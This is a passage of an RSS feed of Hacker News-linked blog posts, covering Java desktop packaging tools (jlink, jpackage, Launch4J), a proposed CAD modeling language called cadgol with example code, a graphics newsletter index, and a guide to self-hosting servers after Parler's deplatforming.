<span>}</span></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Declare dependent modules</td> </tr> <tr> <td><i data-value="2"></i><b>2</b></td> <td>The Greenrobot library is an unnamed module. We need to reference it via the JAR‚Äôs name.</td> </tr> <tr> <td><i data-value="3"></i><b>3</b></td> <td>Allow Greenrobot to use our classes</td> </tr> </tbody></table> </div> <p>Modularizing one‚Äôs application is pretty straightforward. But to decide whether a JDK module will make it into the final runtime, <code>jlink</code> requires to <strong>transitively analyze every dependency</strong> of the application. Yet, <a href="https://blog.frankel.ch/update-state-java-modularization/" target="_blank" rel="noopener">about 35% of the libraries</a> are neither modularized nor declare an <code>Automatic-Module-Name</code> in their <code>MANIFEST.MF</code>.</p> <p>It‚Äôs possible to add this information during one‚Äôs build even though the procedure is error-prone and boring. The description on how to achieve this deserves a post on its own. For more information, please check <a href="https://blogs.oracle.com/javamagazine/containerizing-apps-with-jlink" target="_blank" rel="noopener">this Oracle magazine article</a>. Suffice to say here that it makes heavy use of the <a href="https://github.com/moditect/moditect" target="_blank" rel="noopener">Moditect Maven plugin</a>.</p> <p>After having <a href="https://github.com/ajavageek/renamer-swing/blob/feature/jlink/pom.xml#L56-L108" target="_blank" rel="noopener">configured the POM</a>, packaging the Renamer Swing application yields a folder that contains a runnable launcher script and the necessary modules from the JDK.</p> <p><span><img src="https://blog.frankel.ch/assets/resources/state-jvm-desktop-frameworks/jlink-output.jpg" alt="Output of jlink" width="184" height="288"></span></p> <p>The folder size is around 86MB. By using <code>gzip</code>, you can reduce the size to about a 30MB archive that you can distribute.</p> <p>Note that it will require users to decompress the archive and to know which script to launch, though.</p> </div> </div> <div> <h2 id="other-candidates">Other candidates</h2> <div> <p>Here are some other candidates that I discovered while researching this post. Note that I have experience with none of them but it might be useful for some of you.</p> <ul><li><span>Oracle introduced <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/deploy/packager.html" target="_blank" rel="noopener"><code>javapackager</code></a> in Java 8. <code>javapackager</code> is the ancestor of <code>jpackage</code> and is now superseded by the latter.</span><div> <blockquote> <p>The Java Packager tool can be used to compile, package, sign, and deploy Java and JavaFX applications from the command line. It can be used as an alternative to an Ant task or building the applications in an IDE.</p> </blockquote> </div></li><li><span><a href="https://github.com/edvin/fxlauncher" target="_blank" rel="noopener">FXLauncher</a> is both a launcher and an auto-updater that focuses solely on JavaFX applications.</span><p>FXLauncher is released under the Apache License 2.0.</p></li><li><span><a href="http://launch4j.sourceforge.net/" target="_blank" rel="noopener">Launch4J</a>:</span></li></ul> <div> <div> <div> <blockquote> <p>Launch4j is a cross-platform tool for wrapping Java applications distributed as jars in lightweight Windows native executables. The executable can be configured to search for a certain JRE version or use a bundled one, and it‚Äôs possible to set runtime options, like the initial/max heap size. The wrapper also provides a better user experience through an application icon, a native pre-JRE splash screen, and a Java download page in case the appropriate JRE cannot be found.</p> </blockquote> </div> <p>Launch4J is released under the BSD 3-Clause License but has not seen any release since 2017.</p> </div> </div> <ul><li><span><a href="https://github.com/libgdx/packr" target="_blank" rel="noopener">packr</a>:</span></li></ul> <div> <div> <div> <blockquote> <p>Packages your JAR, assets, and a JVM for distribution on Windows, Linux, and macOS, adding a native executable file to make it appear like a native app. Packr is most suitable for GUI applications, such as games made with libGDX.</p> <p>packr is released under the Apache License 2.0.</p> </blockquote> </div> </div> </div> <ul><li><span><a href="https://www.ej-technologies.com/products/install4j/overview.html" target="_blank" rel="noopener">Install4J</a>:</span></li></ul> <div> <blockquote> <p>install4j is a powerful multi-platform Java installer builder that generates native installers and application launchers for Java applications.</p> </blockquote> </div> <p>install4J is a proprietary product.</p> </div> </div> <div> <h2 id="conclusion">Conclusion</h2> <div> <p>In this post, we browsed through several options to distribute our Java desktop applications:</p> <ul><li><span>Open Web Start is an option based on the former Java Web Start. Users need to install the software on their system so they can execute JNLP files. Noteworthy features include auto-updating and offline mode.</span></li><li><span>JDK includes <code>jpackage</code>. It allows you to create installers that wrap both the JAR and a JRE.</span></li><li><span><code>jlink</code> is also included in the JDK. Instead of creating installers, it ‚Ä¶</span></li></ul></div></div></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/6/">https://blog.frankel.ch/state-jvm-desktop-frameworks/6/</a></em></p>]]>
            </description>
            <link>https://blog.frankel.ch/state-jvm-desktop-frameworks/6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135532</guid>
            <pubDate>Sun, 14 Feb 2021 19:45:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cadgol ‚Äì a cad-native modeling language]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135019">thread link</a>) | @todsacerdoti
<br/>
February 14, 2021 | https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html | <a href="https://web.archive.org/web/*/https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry-6a0133f2f5dd98970b0278801543c5200d">
   <div>
			
	



	<div>
		<div>
			<p><em>[A copy of this blog is available on <a href="https://github.com/karimyaghmour/cadgol">github</a>]</em></p>

<p>Modeling real-world objects with computers traditionally requires using
graphical user interfaces to design, model and simulate such objects and their
interactions and reactions to external objects and forces. Such an approach is,
at first, intuitive since the designer is visually interacting and "crafting"
the object as they go. As explained by Jessie Frazelle
<a href="https://github.com/EmbeddedVentures/community">here</a>, there are limits to this
approach and there's a need for a programming-like language for the creation of
complex shapes using text-based entry similar to a software development
process.</p>

<p>Unfortunately, such a language doesn't presently exist. Or, at the very least,
the existing examples don't provide all the necessary constructs and
capabilities of their fully-featured graphical-based counterparts. Hence,
there's a need to design something that aims at providing the same level of
functionality as a modern CAD tool but based on programming-style paradigms.
But objects aren't software. While some of their features could be usefully
repeated using math-like software expressions, objects are infinitely more
complex in their variety and functionality. There is no "Von Neuman" model for
objects. Looking at traditional software languages alone is therefore not a very
good starting point.</p>

<p>If software alone won't cut then are there already languages and semantics
spaces that can be used to model things other than software? The immediate
obvious answer are RTL/HDL-languages such as Verilog and VHDL. They generally
comprise two types of construct: sequential and combinatorial circuits. They
somewhat look similar but synthesize into different constructs at the hardware
level ... which real physical structures as the final output in the case of ASIC
fabrication. That, though, isn't necessarily why HDLs are most interesting. The
more interesting thing about RTL is how we eventually got to how it's done
today.</p>

<p>Already in the '60s it appears there were attempts at describing hardware using
<a href="https://en.wikipedia.org/wiki/Hardware_description_language#History">software-like languages</a>.
The seminal work, though, seems to be Bell and Newell's 1971 "Computer
Structures: Readings and Examples". In this book, Bell and Newell catalog dozens
of processors and, most importantly, devise a language and notation to describe
those processors in a uniform fashion. They also introduce the term
"register-transfer level" which they define as "The components of an RT system
are registers and functional transfers between registers", which is precisely
what Verilog, VHDL and other modern-day HDLs do. The Instruction Set Processor
(ISP) notation which they describe in their book is then further refined in
further articles and used in the seminal "Introduction to VLSI Systems" by Meade
and Conway.</p>

<p>Now, why is that Bell and Newell so important to the present analysis? Well,
because what lands Bell and Newell to devise ISP is their need to catalog a very
wide variety of systems using a single descriptive language. Which then begs the
question. Is there are catalog of real-world objects that provides us with, if
nothing else, the proper semantic space to properly describe complex real-world
objects in a fashion that fully encompasses their functionality in the same was
a modern day CAD tool would?</p>

<p>It turns out that not only such a thing exists, but it's been being worked on
for a few hundred years and is likely one of the most important pillars of the
world economy. What could that possibly be you ask? Well, simply put,
... patents and, more specifically, the language of patent claims. The fact of
the matter is that in order to be granted, patent claims <strong>must</strong> describe an
invention, typically a real-world physically-structured object, in a
sufficiently unique fashion as to distinguish it from all previously-devised
objects, be they in patents or elsewhere. Consequently, an unimaginable amount
of human intellectual effort has been invested over time in elaborating and
evolving the precision and accuracy of patent claim language to describe all
features and structures of objects humans can envision. There is, therefore,
fertile ground in looking at patent claim language as the basis of a CAD-grade
descriptive language.</p>

<p>Which brings us the current proposal. Based on the needs and analysis above,
what is proposed is a C-like descriptive language that uses patent-claim-like
statements to describe real-world objects for the purpose of being "compiled",
simulated and otherwise processed by tools for enabling designers to create
and analyze the behavior of complex objects. This is, by its very nature, a
rough cut meant to elicit feedback and further discussion. There is likely much
work to be done in specifying semantics, conventions and validating the
usefulness and feasibility of such an approach. Nevertheless, here is what's
proposed as being "cadgol", a cad-native modeling language.</p>

<h2>cadgol example</h2>

<p>Let's start with a cadgol "Hello World!". Here's a mahogany chair in cadgol:</p>

<pre>/*
 * mohagony-chair.cgol
 *
 * A mohagony chair with 4 legs
 *
 * (C) Karim Yaghmour, 2021
 *
 * [ ASL ]
 */

/* The components we need and their local names */
comprises chair.leg as leg_fl, leg_fr, leg_bl, leg_br;
comprises chair.seat as main_seat;
comprises chair.back as main_back;

/* Material */
madeof wood.mohagony.honduran;

/* Fastners */
connector fastners.glue.wood.generic as glue;

/* Initialize component sizes */
leg_fl { dia: 1; height: 16 };
leg_fr { dia: 1; height: 16 };
leg_bl { dia: 1; height: 16 };
leg_br { dia: 1; height: 16 };
main_seat { width: 20; depth: 18, height: 1, leg_dia: 1 };
main_back { width: 10; depth: 1, height: 20 };

/* Assemble components */
assemblage {
    main_seat-&gt;leg-&gt;front-&gt;left  += glue(leg_fl);
    main_seat-&gt;leg-&gt;front-&gt;right += glue(leg_fr);
    main_seat-&gt;leg-&gt;back-&gt;left += glue(leg_bl);
    main_seat-&gt;leg-&gt;back-&gt;right += glue(leg_br);
    main_seat-&gt;back += glue(main_back);
}
</pre>

<p>The <code>comprises</code> statements here indicate the "library" components we are
including and the local instances of said components. There's presumably a
library called <code>chair</code> which has such things as <code>leg</code>, <code>seat</code> and <code>back</code>. Those
are assumed to be generic enough to be used in different chairs.</p>

<p>The <code>madeof</code> statement indicates the material this object is made of and is
assumed to come from a global library of materials. Materials likely provide the
object with color, mass, thermal conductivity, electrical connectivity, Young's
modulus, bending stiffness, etc. An individual object is likely made of a single
material (otherwise use the <code>composite.</code> library ;) ), although a complex object
could be made of several parts made of several differently-typed components. In
this case, the chair is made of Honduran Mahogany, and it's assumed that the
components included didn't themselves already have materials specified for
them. Hence, we can separate describing a part in mathematical terms from the
type of material that's used to make it.</p>

<p>The <code>connector</code> is whatever can be used to connect parts together. In this case
we're using glue as a fastener, and it's a generic wood glue. In a more complex
object we can imagine that other types of connectors could be used such as
welding, injection molding, etc.</p>

<p>Now that we've listed what parts are needed, what the present object is made of,
and the type of connectors used to put it together, we provide some specific
parameters about the components. In this case the description is provided as a
CSS-like set of values based on the types of parameters that can be used to
dictate the part's specifics.</p>

<p>Finally we assemble the object together by connecting the parts together based
on the anchors available for each part. The <code>+=</code> semantics are used to indicate
that it's possible that many objects may connect at a given anchoring
point/surface/axis. Think for example of an injection-molded part which has
many subparts being joined at a specific location.</p>

<p>That's the overall chair.</p>

<p>If we just take a look at the seat, it would look something like this:</p>

<pre>/*
 * chair/seat.cgol
 *
 * A generic chair seat for a chair with 4 legs and a back
 * ...
 */

/**
 * Seat model
 * @width:           seat width
 * @depth:           seat depth
 * @height:          seat height
 * @leg_dia:         leg diameter (assuming round pegs)
 *
 * Models a seat as a basic cube with round pegged legs
 *
 * Note: some variables are implicitly available in all "modeledas()"
 * functions. "anchor" is such a variable.
 */
modeledas(int width, int depth, int height, int leg_dia) {
    object o;
    surface s;
    contact c, r;
    int recess_x, recess_y;

    /* A very simple seat */
    o = cuboid(width, depth, height);

    /* Connectors for legs */
    s = o.bottom();
    c = circle(leg_diameter);
    recess_x = 0.1 * s.x_size;
    recess_y = 0.1 * s.y_size;
    anchor.add("leg-&gt;front-&gt;left") = planar_intersect(s, c, recess_x, recess_y);
    anchor.add("leg-&gt;front-&gt;right") = planar_intersect(s, c, s.x_size - recess_x, recess_y);
    anchor.add("leg-&gt;back-&gt;left") = planar_intersect(s, c, recess_x, s.y_size - recess_y);
    anchor.add("leg-&gt;back-&gt;right") = planar_intersect(s, c, s.x_size - recess_x, s.y_size - recess_y);

    /* Connectors for back */
    s = o.top();
    r = rectangle(x, 0.1 * y);
    anchor.add("back") = planar_intersect(s, r, 0, s.y_size);
}   
</pre>

<p>The <code>modeledas</code> statement takes parameters coming from the initialization of the
part and actually creates the part based on those parameters while also
specifying the anchors to be defined for connecting to this part.  In this case,
the seat is a basic cuboid and recessed anchoring points for attaching legs at
its bottom, and an anchoring point for the back. More complex formulas could be
used used to specify the object or we could leave it open for inclusion of
hand-drawn objects in some IDE such as the ones provided by classic CAD
tools. This would be similar to the way Verilog/VHDL enable including
parts/components/libraries which are "hand drawn" to a ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html">https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html</a></em></p>]]>
            </description>
            <link>https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135019</guid>
            <pubDate>Sun, 14 Feb 2021 18:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graphics Programming Weekly]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 27 (<a href="https://news.ycombinator.com/item?id=26134854">thread link</a>) | @E-Reverance
<br/>
February 14, 2021 | https://www.jendrikillner.com/tags/weekly/ | <a href="https://web.archive.org/web/*/https://www.jendrikillner.com/tags/weekly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  

  

  
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-170/">Graphics Programming weekly - Issue 170 ‚Äî February 14, 2021</a></h2>
    <p>
      
      Summary of articles of the week of February 14, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-169/">Graphics Programming weekly - Issue 169 ‚Äî February 7, 2021</a></h2>
    <p>
      
      Summary of articles of the week of February 7, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-168/">Graphics Programming weekly - Issue 168 ‚Äî January 31, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 31, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-167/">Graphics Programming weekly - Issue 167 ‚Äî January 24, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 24, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-166/">Graphics Programming weekly - Issue 166 ‚Äî January 17, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 17, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-165/">Graphics Programming weekly - Issue 165 ‚Äî January 10, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 10, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-164/">Graphics Programming weekly - Issue 164 ‚Äî January 3, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 3, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-163/">Graphics Programming weekly - Issue 163 ‚Äî December 27, 2020</a></h2>
    <p>
      
      Summary of articles of the week of December 27, 2020.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-162/">Graphics Programming weekly - Issue 162 ‚Äî December 20, 2020</a></h2>
    <p>
      
      Summary of articles of the week of December 20, 2020.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-161/">Graphics Programming weekly - Issue 161 ‚Äî December 13, 2020</a></h2>
    <p>
      
      Summary of articles of the week of December 13, 2020.
      
    </p>
  </div>
  

  
<nav>
  <ul>
    
    
    <li><a href="https://www.jendrikillner.com/tags/weekly/page/2/">Next ¬ª</a></li>
    
  </ul>
</nav>



</div></div>]]>
            </description>
            <link>https://www.jendrikillner.com/tags/weekly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134854</guid>
            <pubDate>Sun, 14 Feb 2021 18:38:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parler‚Äôs epic fail: A crash course on running your own servers]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 116 (<a href="https://news.ycombinator.com/item?id=26134691">thread link</a>) | @fireeyed
<br/>
February 14, 2021 | https://blog.alexgleason.me/run-your-own-server/ | <a href="https://web.archive.org/web/*/https://blog.alexgleason.me/run-your-own-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.alexgleason.me/content/images/size/w300/2021/02/poweredge.png 300w,
                            https://blog.alexgleason.me/content/images/size/w600/2021/02/poweredge.png 600w,
                            https://blog.alexgleason.me/content/images/size/w1000/2021/02/poweredge.png 1000w,
                            https://blog.alexgleason.me/content/images/size/w2000/2021/02/poweredge.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.alexgleason.me/content/images/size/w2000/2021/02/poweredge.png" alt="Parler‚Äôs epic fail: A crash course on running your own servers with a shoestring budget">
            </figure>

            <section>
                <div>
                    <blockquote>First they came for the Communists,<br>and I didn‚Äôt speak up,<br>because I wasn‚Äôt a Communist.<br>Then they came for the Jews,<br>and I didn‚Äôt speak up,<br>because I wasn‚Äôt a Jew.<br>Then they came for the Catholics,<br>and I didn‚Äôt speak up,<br>because I was a Protestant.<br>Then they came for me,<br>and by that time there was no one<br>left to speak up for me.</blockquote><p>In the early days of 2021 we learned the true power of American tech companies. After Trump was ousted by Twitter, the social media alternative Parler was cut off by their cloud hosting provider, Amazon.</p><p>Where do we go from here? What can a freedom-minded person do to avoid censorship by tech oligarchs?</p><p>The only way is to meet them at their level. In some industries it's impossible to challenge the establishment, but anyone can have a voice on the Internet. This is still true in 2021.</p><h2 id="cloud-hosting-vs-real-computers">Cloud hosting vs real computers</h2><p>Cloud hosting has made it easy for anyone to run a website. It lowered the barrier of entry, improved tech literacy, and I wouldn't be where I am today without it. But it's time to cut out the middleman.</p><p>You can run a real server anywhere there's power and an internet connection. You can run a server from your home. You can run it from someone else's home. You can run it from a datacenter in an undisclosed location.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/TPB_servers.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/TPB_servers.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/TPB_servers.jpg 800w" sizes="(min-width: 720px) 720px"><figcaption>Servers for The Pirate Bay at an undisclosed location.</figcaption></figure><p>It's true an ISP can censor, but it's a whole different playing field. You can find datacenters run by Conservative Boomers, Russians, porn companies, and principled free speech advocates. By the time it becomes a bigger problem, I'm sure some of us will be <a href="https://startyourownisp.com/">running our own ISP</a>, too.</p><p>It's a great ability to be able to pick up and move, plug in somewhere else, and continue to stay online. I argue that your chances of survival are much better this way, and Parler is foolish for not going this route. We can do better.</p><h2 id="getting-started-with-a-computer-on-your-home-internet">Getting started with a computer on your home internet</h2><p>Our mission is to run a high-availability production server in a datacenter. But first, we should should experiment with a server at home. Here's what you will need to achieve it:</p><ul><li>An internet connection</li><li>A computer running 24/7</li><li>A router that lets you configure port forwarding</li><li>Ethernet cables</li></ul><p>For higher availability, you may consider:</p><ul><li>Battery backup</li><li>Wireless 4G backup connection</li><li>Fiber-optic internet connection</li></ul><figure><img src="https://blog.alexgleason.me/content/images/2021/02/image.png" alt=""><figcaption>The 'first' Pirate Bay server, on display at the Computer Museum in Link√∂ping, Sweden.</figcaption></figure><p>Running a server at home is a good starting point. It could serve as a testing facility, production backup, or even serve a small online community. Chances are, you already have all the equipment needed.</p><p>Check out <a href="https://www.reddit.com/r/homelab/">/r/homelab</a> on Reddit for inspiration.</p><p>It is critical you have fast enough <strong>upload </strong>speeds if you're serving real users. Check out <a href="https://www.speedtest.net/">speedtest.net</a> to find out.</p><p>With upload speeds as low as 5 Mbps, you may be able to host an online community with 20,000 users. Keep in mind your video calls will compete for upload bandwidth on the home network.</p><p>If you score a fiber internet connection, that is really good, as it can give up to 1 Gbps <em>upload</em> speeds. That's quite literally datacenter levels of bandwidth at your home.</p><p>With this setup, you must be able to accept power outages and potential network failures. A battery backup and wireless internet backup can help with this.</p><p>Some people have taken this concept very far, building literal datacenters in their homes.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/datacenter.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/datacenter.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/datacenter.jpg 800w" sizes="(min-width: 720px) 720px"><figcaption>Home datacenter by Qu√©bec, Canada IT Teacher <a href="https://ve2cuy.wordpress.com/my-home-data-center/">VE2CUY</a>.</figcaption></figure><p>To make your computer accessible from the outside world, you can configure a port forward in your router. This will allow users to visit your public IP address to access your home server. You may then accordingly set up some domain names for your public IP.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-14-12-38.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/Screenshot-from-2021-02-10-14-12-38.png 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/Screenshot-from-2021-02-10-14-12-38.png 1000w, https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-14-12-38.png 1011w" sizes="(min-width: 720px) 720px"><figcaption>My home router, forwarding ports 80 and 443 to my server's local IP.</figcaption></figure><p>Some ISPs offer expensive business plans that give you a static IP address, but I just used my dynamic IP. It seems to change rarely, if ever.</p><h2 id="obtaining-a-rack-server">Obtaining a rack server</h2><p>When running a home server isn't enough, you'll need to move into a datacenter.</p><p>Before getting into a datacenter, you'll need a computer than can fit into a standard rack. Rack servers are very similar to desktops, but come in a form factor of 1U, 2U, 3U, and 4U.</p><p>1U describes the height. 2U is the same height as two 1U servers, and so on. A typical rack at a datacenter is 42U, so it can fit fourty-two 1U servers, or twenty-one 2U. The depth of a server is also variable, but that doesn't really matter unless you're buying a rack. Servers are all the same width.</p><p>The server I chose is a <a href="https://downloads.dell.com/manuals/all-products/esuprt_ser_stor_net/esuprt_poweredge/poweredge-r720_reference-guide_en-us.pdf">Dell PowerEdge R720</a>, which I purchased for $450 off eBay. This 2U server has 32 vCores, 64 GB of RAM, and a RAID interface with 8 HDD slots.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg 1000w, https://blog.alexgleason.me/content/images/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg 1478w" sizes="(min-width: 720px) 720px"><figcaption>My Dell PowerEdge R720 connected to my home internet.</figcaption></figure><p>It connects to the wall with standard power cables. There are 4 Ethernet ports, two USB ports, and a VGA input for attaching a screen.</p><p>Note that it's a lot bigger than you think! Make sure you have space for it.</p><p>I chose a PowerEdge because they're beloved by hobbyists, and a lot of information exists about them online. My model is from 2012, which seems to be a sweet spot between power and affordability. These machines are built to last a very long time.</p><p>Other models from that era are equally good. For a 1U option, consider a PowerEdge R320. To understand the naming convention: the R stands for "rack", while the R3xx and R7xx are 1U and 2U products respectively. The <a href="https://www.dell.com/en-us/work/shop/dell-poweredge-servers/sc/servers/poweredge-rack-servers">newest PowerEdge models right now</a> are the R340 and R740.</p><p>You should run this server from your home internet at first, while you get things up and running.</p><h3 id="installing-hard-drives">Installing hard drives</h3><p>For obvious reasons, hard drives were not included. Right now, refurbished 4TB SATA HDDs have the best cost per Gigabyte. I bought some off Amazon. HGST brand is a good bet, as they are inexpensive refurbished Western Digital drives with a different label.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/sata_vs_sas.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/sata_vs_sas.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/sata_vs_sas.jpg 1000w" sizes="(min-width: 720px) 720px"><figcaption>SATA drive on top, SAS on the bottom.</figcaption></figure><p>It's worth noting most servers support SAS drives also. SAS is an alternative to SATA with better reliability and a different performance profile. The connector in my R720 is actually a SAS connector, but SATA drives fit into them and work just fine.</p><p>I went with SATA for my build because of better price and availability. Just know it's an option, and don't mix and match them while doing RAID.</p><h3 id="differences-in-ram">Differences in RAM</h3><p>My PowerEdge uses DDR3 RDIMM memory. I should note that UDIMM and LDIMM are also options. Traditional desktop computers use UDIMM (unbuffered memory), while servers have an option between 3 different types. You must not mix different types in the same computer.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 1000w, https://blog.alexgleason.me/content/images/size/w1600/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 1600w, https://blog.alexgleason.me/content/images/size/w2400/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Registered memory (RDIMM)</figcaption></figure><p>RDIMM (registered memory) is the most common type of memory for servers. Each stick contains an extra chip (a register) used to reduce load to the memory controller, letting your hardware last longer.</p><p>When upgrading RAM, you should also pay special attention to the <strong>rank</strong> of the memory. Rank is usually a number between 1 and 4. Your server has a maximum allowed rank per channel, so if the total rank is too high you might have to leave some slots empty.</p><h3 id="installing-an-os">Installing an OS</h3><p>For the OS, I cannot recommend <a href="https://www.proxmox.com/en/proxmox-ve">Proxmox VE</a> enough. It allows you to easily create virtual machines without much knowledge or pain.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-09-14-06-22.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/Screenshot-from-2021-02-09-14-06-22.png 600w, https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-09-14-06-22.png 951w" sizes="(min-width: 720px) 720px"><figcaption>Proxmox VE running on my server.</figcaption></figure><p>I recommend this for a first server because of its flexibility, and you can always add bare metal nodes to the network later. All virtual machines appear as first-class citizens on the host network, so you can easily network them with physical nodes.</p><h3 id="further-learning">Further learning</h3><p>YouTube has been a godsend for helping me learn all this stuff and set it up. Here are a few recommendations:</p><ul><li><a href="https://www.youtube.com/watch?v=86KK_dZoCJ0">Manually Updating the Firmwares on a Dell PowerEdge R610</a> by Rob Willis</li><li><a href="https://www.youtube.com/watch?v=ck3gx9HB9-k&amp;list=PLSNNzog5eydtmcbcbc1b8pVRkgre3vNUy">Switching and Routing</a> by Sunny Classroom</li><li><a href="https://www.youtube.com/watch?v=6-66D9J5PkY">Data Center NETWORKS (what do they look like??)</a> by NetworkChuck</li><li><a href="https://www.youtube.com/watch?v=hdoBQNI_Ab8">How to Virtualize Your Home Router / Firewall Using pfSense</a> by Techno Tim</li><li><a href="https://www.youtube.com/watch?v=wFCc3ts74pQ">A DAY in the LIFE of the DATA CENTRE | RACKING SERVERS with ASH &amp; JAMES!</a> by Custodian Data Centres</li></ul><h2 id="installing-your-server-at-a-local-datacenter">Installing your server at a local datacenter</h2><p>Once your rack server is all set up and ready to go, it's time to move it to a datacenter.</p><p>Some datacenters are privately owned by a single company like Google, but many others are independent companies that lease their racks to anyone willing to pay. This is called <em>colocation</em>.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/h2_data_center_banner_bg.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/h2_data_center_banner_bg.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/h2_data_center_banner_bg.jpg 800w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.datafoundry.com/">Data Foundry</a>, an independent Houston datacenter offering colocation.</figcaption></figure><p>If you live near a metropolitan area, chances are there's a datacenter nearby willing to let you install your own server. You will get access to power, high speed internet, and multiple layers of security.</p><p>Try searching "&lt;my city&gt; datacenter" or "&lt;my city&gt; ISP".</p><p>If they offer it, I recommend scheduling a tour with a local datacenter. It's a lot of fun and will give you a better idea of what you're dealing with.</p><p>Most datacenters only lease by the rack. These racks can hold up to 42 servers and are far too expensive. What you need is a company that lives <em>inside </em>the datacenter and is willing to lease you space <em>within</em> a single rack. You are looking for something like this:</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-12-40-34.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/Screenshot-from-2021-02-10-12-40-34.png 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/Screenshot-from-2021-02-10-12-40-34.png 1000w, https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-12-40-34.png 1151w" sizes="(min-width: 720px) 720px"><figcaption>Colo pricing from <a href="https://www.layerhost.com/houston-colocation">LayerHost</a> in Houston. LayerHost is located inside of Data 